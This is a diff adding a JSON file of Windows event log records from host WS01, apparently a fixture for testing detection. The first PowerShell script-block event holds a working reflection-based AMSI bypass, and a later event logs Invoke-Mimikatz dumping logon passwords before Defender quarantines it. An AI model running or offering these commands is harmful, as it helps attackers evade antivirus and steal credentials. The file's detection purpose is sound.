@@ -1,0 +1,206 @@
+[
+  {
+    "Event": {
+      "System": {
+        "Provider": {
+          "#attributes": {
+            "Name": "Microsoft-Windows-PowerShell"
+          }
+        },
+        "EventID": {
+          "#attributes": {
+            "Qualifiers": 0
+          },
+          "#text": 4104
+        },
+        "Level": 0,
+        "TimeCreated": {
+          "#attributes": {
+            "SystemTime": "2026-11-03T09:50:00.000000Z"
+          }
+        },
+        "EventRecordID": 1073,
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "Computer": "WS01"
+      },
+      "EventData": {
+        "Data": [
+          {
+            "#attributes": {
+              "Name": "MessageNumber"
+            },
+            "#text": "1"
+          },
+          {
+            "#attributes": {
+              "Name": "MessageTotal"
+            },
+            "#text": "1"
+          },
+          {
+            "#attributes": {
+              "Name": "ScriptBlockText"
+            },
+            "#text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+          },
+          {
+            "#attributes": {
+              "Name": "ScriptBlockId"
+            },
+            "#text": "7f1c"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "Event": {
+      "System": {
+        "Provider": {
+          "#attributes": {
+            "Name": "Microsoft-Windows-PowerShell"
+          }
+        },
+        "EventID": {
+          "#attributes": {
+            "Qualifiers": 0
+          },
+          "#text": 4104
+        },
+        "Level": 0,
+        "TimeCreated": {
+          "#attributes": {
+            "SystemTime": "2026-11-03T09:50:10.000000Z"
+          }
+        },
+        "EventRecordID": 1074,
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "Computer": "WS01"
+      },
+      "EventData": {
+        "Data": [
+          {
+            "#attributes": {
+              "Name": "MessageNumber"
+            },
+            "#text": "1"
+          },
+          {
+            "#attributes": {
+              "Name": "MessageTotal"
+            },
+            "#text": "1"
+          },
+          {
+            "#attributes": {
+              "Name": "ScriptBlockText"
+            },
+            "#text": "Get-ChildItem C:\\Reports | Measure-Object"
+          },
+          {
+            "#attributes": {
+              "Name": "ScriptBlockId"
+            },
+            "#text": "8a2d"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "Event": {
+      "System": {
+        "Provider": {
+          "#attributes": {
+            "Name": "Microsoft-Windows-PowerShell"
+          }
+        },
+        "EventID": {
+          "#attributes": {
+            "Qualifiers": 0
+          },
+          "#text": 4103
+        },
+        "Level": 0,
+        "TimeCreated": {
+          "#attributes": {
+            "SystemTime": "2026-11-03T09:50:20.000000Z"
+          }
+        },
+        "EventRecordID": 1075,
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "Computer": "WS01"
+      },
+      "EventData": {
+        "Data": [
+          {
+            "#attributes": {
+              "Name": "ContextInfo"
+            },
+            "#text": "Host Application = powershell.exe"
+          },
+          {
+            "#attributes": {
+              "Name": "Payload"
+            },
+            "#text": "CommandInvocation(Invoke-Mimikatz): \"Invoke-Mimikatz\" ParameterBinding(Invoke-Mimikatz): name=\"Command\"; value=\"sekurlsa::logonpasswords\""
+          }
+        ]
+      }
+    }
+  },
+  {
+    "Event": {
+      "System": {
+        "Provider": {
+          "#attributes": {
+            "Name": "Microsoft-Windows-Windows Defender"
+          }
+        },
+        "EventID": {
+          "#attributes": {
+            "Qualifiers": 0
+          },
+          "#text": 1116
+        },
+        "Level": 0,
+        "TimeCreated": {
+          "#attributes": {
+            "SystemTime": "2026-11-03T09:51:40.000000Z"
+          }
+        },
+        "EventRecordID": 1076,
+        "Channel": "Microsoft-Windows-Windows Defender/Operational",
+        "Computer": "WS01"
+      },
+      "EventData": {
+        "Data": [
+          {
+            "#attributes": {
+              "Name": "Threat Name"
+            },
+            "#text": "HackTool:Win64/Mimikatz"
+          },
+          {
+            "#attributes": {
+              "Name": "Severity Name"
+            },
+            "#text": "High"
+          },
+          {
+            "#attributes": {
+              "Name": "Path"
+            },
+            "#text": "file:_C:\\Users\\Public\\m.exe"
+          },
+          {
+            "#attributes": {
+              "Name": "Action Name"
+            },
+            "#text": "Quarantine"
+          }
+        ]
+      }
+    }
+  }
+]
